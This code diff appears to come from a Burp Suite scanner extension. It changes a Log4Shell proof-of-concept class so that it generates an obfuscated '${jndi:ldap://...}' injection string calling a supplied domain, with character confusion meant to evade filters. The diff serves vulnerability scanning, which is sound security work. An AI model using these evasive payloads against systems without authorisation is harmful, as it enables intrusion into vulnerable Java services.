@@ -6,10 +6,12 @@ import burp.utils.Utils;
 import static burp.utils.Utils.confusionChars;
 
 public class POC2 implements IPOC {
-    
+
     @Override
     public String generate(String domain) {
-        return "${" + Utils.confusionChars(Utils.splitString(String.format("jndi:ldap://%s/%s", domain, Utils.GetRandomString(Utils.GetRandomNumber(2, 5))))) + "}";
+        String payloadContent = String.format("://%s/%s", domain, Utils.GetRandomString(Utils.GetRandomNumber(2, 5)));
+        String confusionPayload = Utils.confusionChars(Utils.splitString(payloadContent), (int) Math.ceil(payloadContent.length() * (Utils.GetRandomNumber(30, 70) / 100.0)));
+        return "${" + Utils.confusionChars(Utils.splitString("jndi"), 4) + ":" + Utils.confusionChars(Utils.splitString("ldap"), 4) + confusionPayload + "}";
     }
 
 
